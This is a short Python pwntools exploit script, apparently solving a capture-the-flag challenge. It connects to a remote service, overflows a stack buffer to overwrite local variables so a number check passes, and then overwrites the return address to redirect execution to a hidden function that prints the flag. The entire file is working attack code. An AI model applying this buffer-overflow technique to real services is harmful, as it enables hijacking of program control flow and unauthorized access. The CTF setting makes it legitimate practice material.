from pwn import *

host = "10.213.0.102"
port = 31793  # updated
context.arch = 'i386'
context.log_level = 'info'

p = remote(host, port)
desire_addr = 0x080491d6


guess = 1
payload = str(guess).encode()
    # Fill local_34 exactly
payload += b"A" * (32 - len(payload))
    # Overwrite local_14 and local_10 with guess
payload += p32(guess)  # local_14
payload += p32(guess)  # local_10 → match!

for i in range(9):
    resp  = p.recvuntil(b"Enter your lucky number:")
    print(resp)

    p.sendline(payload)
    p.recvline()  # "You got it:"



# Now at offset 40 → pad 4 bytes to reach return address (offset 44)
payload += b"B" * 12
payload += p32(desire_addr)  # overwrite return address
p.sendline(payload)


# Now dream() returns → jumps to desire() → prints flag
print(p.recvall().decode())